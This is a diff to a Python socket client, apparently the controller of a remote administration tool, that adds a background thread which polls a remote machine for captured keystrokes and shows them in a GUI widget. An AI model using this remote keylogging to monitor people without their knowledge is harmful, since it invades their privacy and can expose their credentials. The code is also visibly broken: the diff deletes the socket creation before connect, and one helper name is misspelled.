@@ -4,8 +4,9 @@ import threading
 import struct
 import pickle
 from task_manager import process_opcode
+from utils import stoppabe_thread
 from file_management import *
-from keylogger import create_file_logger
+from client import addText
 
 BUF_SIZE = 256
 class SocketClient:
@@ -64,6 +65,15 @@ class SocketClient:
             return self.__clean()
         except OSError:
             return self.__clean
+    
+    def __keyhook_loop(self, widget):
+        while not threading.current_thread().is_stopped():
+            with self.__lock:
+                data = self.__request('request_key')
+                if data is None:
+                    return
+                addText(widget, data)
+            time.sleep(0.1)
             
     def disconnect(self):
         """
@@ -77,7 +87,6 @@ class SocketClient:
         
     def connect(self, host, port):
         try:
-            self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.__client_socket.connect((host, port))
             self.running = True
             return True
@@ -87,11 +96,19 @@ class SocketClient:
     def request_mac(self):
         return self.__request('request_mac')
     
-    def request_key(self):
-        return self.__request('request_key')
+    def start_keyhook(self, widget):
+        if not self.__keylogger:
+            self.__keylogger = stoppabe_thread(target = self.__keyhook_loop, 
+                                               args=[widget], daemon = True)
+            self.__keylogger.start()
             
     def stop_keyhook(self):
-        return self.__request('stop_key')
+        self.__lock.acquire()
+        if self.__keylogger:
+            self.__request('stop_key')
+            self.__keylogger.stop()
+            self.__keylogger = None
+        self.__lock.release()
         
     def logout(self):
         return self.__request("logout")
